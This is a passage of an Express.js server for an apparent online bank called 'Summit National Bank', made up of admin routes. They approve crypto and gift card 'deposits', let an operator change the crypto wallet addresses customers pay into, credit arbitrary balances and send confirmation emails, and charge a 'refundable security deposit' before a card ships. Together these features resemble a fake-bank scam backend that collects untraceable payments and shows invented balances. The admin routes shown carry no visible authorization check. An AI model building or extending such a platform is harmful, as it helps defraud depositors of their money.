    card.depositStatus = 'required';
    card.shipped = false;
  } else if (dep === 0) {
    card.depositStatus = 'none';
    card.shipped = true;
  }
  db.save();
  db.addAudit(`Updated refundable security deposit to <b>${db.money0(dep)}</b> for card <span class="mono">••••${card.cardNo.slice(-4)}</span> (${db.esc(card.name)}).`, 'oth', 'Dana Reyes');
  res.json({ ok: true });
});

// Reject credit card
app.post('/api/admin/reject-card', (req, res) => {
  const { id, reason } = req.body;
  const data = db.load();
  const app = data.applications.cards.find(c => c.id === id);
  if (!app) return res.json({ ok: false, error: 'Application not found.' });
  app.status = 'rejected'; app.rejectReason = reason;
  db.save();
  db.addAudit(`Rejected credit card application from <b>${db.esc(app.name)}</b>. Reason: ${db.esc(reason)}.`, 'rej', 'Dana Reyes');
  mailer.notifyCardRejected(app.email, app.name, app.cardType, reason).catch(e => console.error('Email error:', e.message));
  res.json({ ok: true });
});

// Approve deposit
app.post('/api/admin/approve-deposit', (req, res) => {
  const { id } = req.body;
  const data = db.load();
  const app = data.applications.deposits.find(d => d.id === id);
  if (!app) return res.json({ ok: false, error: 'Application not found.' });
  const acct = data.accounts.find(a => a.id === app.acctId);
  if (acct) acct.balance += app.amount;
  data.transactions.push({ id: db.nextId('txn'), customerId: app.customerId, name: app.name, acctNo: app.acctNo, type: app.depType, direction: 'in', amount: app.amount, recipient: app.source, ref: 'DEP-' + app.id, status: 'approved', date: Date.now() });
  app.status = 'approved';
  db.save();
  db.addAudit(`Approved deposit (${app.depType}, ${db.money(app.amount)}) for <b>${db.esc(app.name)}</b>. Account <span class="mono">${app.acctNo}</span> credited. New balance: ${db.money(acct ? acct.balance : 0)}.`, 'app', 'Dana Reyes');
  const depAppCust = data.customers.find(x => x.id === app.customerId);
  if (depAppCust) mailer.notifyDepositApproved(depAppCust.email, app.name, app.depType, app.amount, app.acctNo, acct ? acct.balance : 0).catch(e => console.error('Email error:', e.message));
  res.json({ ok: true });
});

// Reject deposit
app.post('/api/admin/reject-deposit', (req, res) => {
  const { id, reason } = req.body;
  const data = db.load();
  const app = data.applications.deposits.find(d => d.id === id);
  if (!app) return res.json({ ok: false, error: 'Application not found.' });
  app.status = 'rejected'; app.rejectReason = reason;
  db.save();
  db.addAudit(`Rejected deposit (${app.depType}, ${db.money(app.amount)}) from <b>${db.esc(app.name)}</b>. Reason: ${db.esc(reason)}.`, 'rej', 'Dana Reyes');
  const depRejCust = data.customers.find(x => x.id === app.customerId);
  if (depRejCust) mailer.notifyDepositRejected(depRejCust.email, app.name, app.depType, app.amount, reason).catch(e => console.error('Email error:', e.message));
  res.json({ ok: true });
});

// Approve transaction
app.post('/api/admin/approve-transaction', (req, res) => {
  const { id } = req.body;
  const data = db.load();
  const app = data.applications.transactions.find(t => t.id === id);
  if (!app) return res.json({ ok: false, error: 'Transaction not found.' });
  const acct = data.accounts.find(a => a.id === app.fromAcctId);
  if (app.direction === 'out') {
    if (acct && app.amount > acct.balance) return res.json({ ok: false, error: 'Insufficient funds at time of approval.' });
    if (acct) acct.balance -= app.amount;
  } else {
    if (acct) acct.balance += app.amount;
  }
  data.transactions.push({ id: db.nextId('txn'), customerId: app.customerId, name: app.name, acctNo: app.acctNo, type: app.type, direction: app.direction, amount: app.amount, recipient: app.recipient, ref: app.ref, status: 'approved', date: Date.now() });
  app.status = 'approved';
  db.save();
  const dir = app.direction === 'out' ? 'from' : 'to';
  db.addAudit(`Approved ${app.type} (${db.money(app.amount)}) ${dir} <b>${db.esc(app.name)}</b>. Processed. Account balance: ${db.money(acct ? acct.balance : 0)}.`, 'app', 'Dana Reyes');
  const txnAppCust = data.customers.find(x => x.id === app.customerId);
  if (txnAppCust) mailer.notifyTransactionApproved(txnAppCust.email, app.name, app.type, app.amount, app.recipient, app.acctNo, acct ? acct.balance : 0).catch(e => console.error('Email error:', e.message));
  res.json({ ok: true });
});

// Reject transaction
app.post('/api/admin/reject-transaction', (req, res) => {
  const { id, reason } = req.body;
  const data = db.load();
  const app = data.applications.transactions.find(t => t.id === id);
  if (!app) return res.json({ ok: false, error: 'Transaction not found.' });
  app.status = 'rejected'; app.rejectReason = reason;
  db.save();
  db.addAudit(`Rejected ${app.type} (${db.money(app.amount)}) from <b>${db.esc(app.name)}</b>. Reason: ${db.esc(reason)}.`, 'rej', 'Dana Reyes');
  const txnRejCust = data.customers.find(x => x.id === app.customerId);
  if (txnRejCust) mailer.notifyTransactionRejected(txnRejCust.email, app.name, app.type, app.amount, reason).catch(e => console.error('Email error:', e.message));
  res.json({ ok: true });
});

// Approve crypto deposit
app.post('/api/admin/approve-crypto', (req, res) => {
  const { id } = req.body;
  const data = db.load();
  const app = data.applications.crypto.find(c => c.id === id);
  if (!app) return res.json({ ok: false, error: 'Deposit not found.' });
  let acct = app.toAccount ? data.accounts.find(a => a.id === app.toAccount) : data.accounts.find(a => a.customerId === app.customerId && a.type === 'Checking');
  if (!acct) acct = data.accounts.find(a => a.customerId === app.customerId);
  const usd = Number(app.amount) || 0;
  if (acct) {
    acct.balance += usd;
    data.transactions.push({ id: db.nextId('txn'), customerId: app.customerId, name: app.name, acctNo: acct.acctNo, type: 'Crypto Deposit (' + app.coin + ')', direction: 'in', amount: usd, recipient: app.coin + ' deposit — hash ' + (app.txnHash || 'n/a'), ref: 'CRY-' + app.id, status: 'approved', date: Date.now() });
  }
  app.status = 'approved';
  db.save();
  db.addAudit(`Approved crypto deposit (<b>${db.esc(app.coin)}</b>, ${db.money(usd)}) for <b>${db.esc(app.name)}</b>. Credited to account <span class="mono">${acct ? acct.acctNo : 'n/a'}</span>. New balance: ${db.money(acct ? acct.balance : 0)}.`, 'app', 'Dana Reyes');
  const cryAppCust = data.customers.find(x => x.id === app.customerId);
  if (cryAppCust) mailer.notifyCryptoApproved(cryAppCust.email, app.name, app.coin, usd, acct ? acct.acctNo : 'n/a', acct ? acct.balance : 0).catch(e => console.error('Email error:', e.message));
  res.json({ ok: true });
});

// Reject crypto deposit
app.post('/api/admin/reject-crypto', (req, res) => {
  const { id, reason } = req.body;
  const data = db.load();
  const app = data.applications.crypto.find(c => c.id === id);
  if (!app) return res.json({ ok: false, error: 'Deposit not found.' });
  app.status = 'rejected'; app.rejectReason = reason;
  db.save();
  db.addAudit(`Rejected crypto deposit (<b>${db.esc(app.coin)}</b>) from <b>${db.esc(app.name)}</b>. Reason: ${db.esc(reason)}.`, 'rej', 'Dana Reyes');
  const cryRejCust = data.customers.find(x => x.id === app.customerId);
  if (cryRejCust) mailer.notifyCryptoRejected(cryRejCust.email, app.name, app.coin, reason).catch(e => console.error('Email error:', e.message));
  res.json({ ok: true });
});

// Approve gift card deposit
app.post('/api/admin/approve-giftcard', (req, res) => {
  const { id } = req.body;
  const data = db.load();
  const app = data.applications.giftcards.find(g => g.id === id);
  if (!app) return res.json({ ok: false, error: 'Gift card deposit not found.' });
  let acct = app.toAccount ? data.accounts.find(a => a.id === app.toAccount) : data.accounts.find(a => a.customerId === app.customerId && a.type === 'Checking');
  if (!acct) acct = data.accounts.find(a => a.customerId === app.customerId);
  const usd = Number(app.cardValue) || 0;
  if (acct) {
    acct.balance += usd;
    data.transactions.push({ id: db.nextId('txn'), customerId: app.customerId, name: app.name, acctNo: acct.acctNo, type: 'Gift Card Deposit (' + app.cardBrand + ')', direction: 'in', amount: usd, recipient: app.cardBrand + ' gift card redemption', ref: 'GFT-' + app.id, status: 'approved', date: Date.now() });
  }
  app.status = 'approved';
  db.save();
  db.addAudit(`Approved gift card deposit (${db.esc(app.cardBrand)}, ${db.money(usd)}) for <b>${db.esc(app.name)}</b>. Credited to account <span class="mono">${acct ? acct.acctNo : 'n/a'}</span>. New balance: ${db.money(acct ? acct.balance : 0)}.`, 'app', 'Dana Reyes');
  const gcAppCust = data.customers.find(x => x.id === app.customerId);
  if (gcAppCust) mailer.notifyGiftcardApproved(gcAppCust.email, app.name, app.cardBrand, usd, acct ? acct.acctNo : 'n/a', acct ? acct.balance : 0).catch(e => console.error('Email error:', e.message));
  res.json({ ok: true });
});

// Reject gift card deposit
app.post('/api/admin/reject-giftcard', (req, res) => {
  const { id, reason } = req.body;
  const data = db.load();
  const app = data.applications.giftcards.find(g => g.id === id);
  if (!app) return res.json({ ok: false, error: 'Gift card deposit not found.' });
  app.status = 'rejected'; app.rejectReason = reason;
  db.save();
  db.addAudit(`Rejected gift card deposit (${db.esc(app.cardBrand)}) from <b>${db.esc(app.name)}</b>. Reason: ${db.esc(reason)}.`, 'rej', 'Dana Reyes');
  const gcRejCust = data.customers.find(x => x.id === app.customerId);
  if (gcRejCust) mailer.notifyGiftcardRejected(gcRejCust.email, app.name, app.cardBrand, reason).catch(e => console.error('Email error:', e.message));
  res.json({ ok: true });
});

// Update crypto wallet
app.post('/api/admin/update-wallet', (req, res) => {
  const { coin, address, network } = req.body;
  const data = db.load();
  if (!data.cryptoWallets[coin]) data.cryptoWallets[coin] = { address: '', network: '' };
  data.cryptoWallets[coin].address = address;
  if (network) data.cryptoWallets[coin].network = network;
  db.save();
  db.addAudit(`Updated crypto wallet for <b>${db.esc(coin)}</b>. New address: <span class="mono">${db.esc(address)}</span>.`, 'oth', 'Dana Reyes');
  res.json({ ok: true });
});

// Add crypto wallet
app.post('/api/admin/add-wallet', (req, res) => {
  const { coin, address, network } = req.body;
  const data = db.load();
  if (data.cryptoWallets[coin]) return res.json({ ok: false, error: 'A wallet for this coin already exists.' });
  data.cryptoWallets[coin] = { address, network: network || '' };
  db.save();
  db.addAudit(`Added new crypto wallet for <b>${db.esc(coin)}</b>. Address: <span class="mono">${db.esc(address)}</span>.`, 'oth', 'Dana Reyes');
  res.json({ ok: true });
});

// Remove crypto wallet
app.post('/api/admin/remove-wallet', (req, res) => {
  const { coin } = req.body;
  const data = db.load();
  if (!data.cryptoWallets[coin]) return res.json({ ok: false, error: 'Wallet not found.' });
  delete data.cryptoWallets[coin];
  db.save();
  db.addAudit(`Removed crypto wallet for <b>${db.esc(coin)}</b>.`, 'rej', 'Dana Reyes');
  res.json({ ok: true });
});

// Manual credit account
app.post('/api/admin/credit-account', (req, res) => {
  const { acctId, amount, reason, note } = req.body;
  const data = db.load();
  const acct = data.accounts.find(a => a.id === acctId);
  if (!acct) return res.json({ ok: false, error: 'Account not found.' });
  acct.balance += amount;
  data.transactions.push({ id: db.nextId('txn'), customerId: acct.customerId, name: acct.name, acctNo: acct.acctNo, type: reason, direction: 'in', amount: amount, recipient: note || 'Manual credit by admin', ref: 'MCR-' + Date.now().toString(36).toUpperCase(), status: 'approved', date: Date.now() });
  db.save();
  db.addAudit(`Credited <b>${db.money(amount)}</b> to <b>${db.esc(acct.name)}</b> (${acct.type} <span class="mono">${acct.acctNo}</span>). Reason: ${db.esc(reason)}${note ? ' · ' + db.esc(note) : ''}. New balance: ${db.money(acct.balance)}.`, 'cre', 'Dana Reyes');
  const credCust = data.customers.find(x => x.id === acct.customerId);
  if (credCust) mailer.notifyManualCredit(credCust.email, acct.name, amount, reason, acct.balance).catch(e => console.error('Email error:', e.message));
  res.json({ ok: true, newBalance: acct.balance });
});

// Freeze/unfreeze customer
app.post('/api/admin/toggle-freeze', (req, res) => {
  const { customerId } = req.body;
  const data = db.load();
  const c = data.customers.find(x => x.id === customerId);
  if (!c) return res.json({ ok: false, error: 'Customer not found.' });
  c.status = c.status === 'active' ? 'frozen' : 'active';
  db.save();
  db.addAudit(`${c.status === 'frozen' ? 'Froze' : 'Unfroze'} customer account <b>${db.esc(c.name)}</b> (${c.email}).`, c.status === 'frozen' ? 'rej' : 'app', 'Dana Reyes');
  if (c.status === 'frozen') mailer.notifyAccountFrozen(c.email, c.name).catch(e => console.error('Email error:', e.message));
  else mailer.notifyAccountUnfrozen(c.email, c.name).catch(e => console.error('Email error:', e.message));
  res.json({ ok: true, status: c.status });
});

// Reset database (admin only)
app.post('/api/admin/reset', (req, res) => {
  db.reset();
  res.json({ ok: true });
});

/* ==========================================================================
   EMAIL TEST ENDPOINT — Admin can test email configuration
   ========================================================================== */
app.post('/api/admin/test-email', (req, res) => {
  const { to } = req.body;
  if (!to || !to.includes('@')) return res.json({ ok: false, error: 'Please provide a valid email address.' });
  mailer.sendEmail({
    to: to,
    subject: `Test Email from Summit National Bank — Email Notifications Active`,
    html: mailer.emailTemplate('Email Notifications Test', `
      <p>This is a test email from <strong>Summit National Bank</strong>.</p>
      <p>If you received this email, it means your email notification system is working correctly.</p>
      <p>Customers will now receive automatic email notifications for:</p>
      <ul style="color:#374151;line-height:1.8;">
        <li>Account application received & approved</li>
        <li>Loan application received, approved & rejected</li>
        <li>Credit card application received, approved & rejected</li>
        <li>Deposit requests received, approved & rejected</li>
        <li>Transfer/payment received, approved & rejected</li>
        <li>Crypto deposit received, approved & rejected</li>
        <li>Gift card deposit received, approved & rejected</li>
        <li>Password and email changes (security alerts)</li>
        <li>Account freeze/unfreeze notifications</li>
        <li>Admin chat replies</li>
        <li>Manual account credits</li>
      </ul>
      <p style="margin-top:24px;">Best regards,<br><strong>System Administrator</strong><br>Summit National Bank</p>
    `),
  }).then(result => {
    if (result.ok) {
      res.json({ ok: true, message: result.simulated ? 'Email system is in LOG-ONLY mode (no RESEND_API_KEY configured). Set up Resend to send real emails.' : 'Test email sent successfully!' });
    } else {
      res.json({ ok: false, error: result.error || 'Failed to send test email.', details: result.details || '' });
    }
  }).catch(e => res.json({ ok: false, error: e.message }));
});

/* ==========================================================================
   API 404 HANDLER: Return JSON for unmatched API routes
   ========================================================================== */
app.all('/api/*', (req, res) => {
  res.status(404).json({ ok: false, error: 'API endpoint not found: ' + req.path });
});

/* ==========================================================================
   CATCH-ALL: Serve index.html for any non-API route (SPA fallback)
   ========================================================================== */
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Export app for serverless platforms (Vercel, etc.)
module.exports = app;

// Only start the HTTP listener when run directly (local development / Railway)
// On Vercel, the serverless wrapper imports this module without calling listen()
if (require.main === module) {
  // --- Hourly automatic database backup ---
  // Railway persists the volume, but we add automatic backups as extra safety
  setInterval(() => {
    try {
      db.load();
      if (typeof db.backup === 'function') {
        db.backup();
      }
    } catch (e) {
      console.error('Backup error:', e.message);
    }
  }, 60 * 60 * 1000); // every hour

  // Railway requirement: MUST bind to 0.0.0.0 (not localhost) so the edge proxy can reach us.
  // See https://docs.railway.com/networking/troubleshooting/application-failed-to-respond
  app.listen(PORT, '0.0.0.0', () => {
    const dataDir = process.env.DATA_DIR || path.join(__dirname, 'data');
    console.log(`Summit National Bank server running on port ${PORT} (host 0.0.0.0)`);
    console.log(`Data directory: ${dataDir}`);
    console.log(`Persistent storage: ${process.env.DATA_DIR ? 'YES (volume mounted)' : 'NO (using local ./data — set DATA_DIR=/data on Railway)'}`);
  });
}
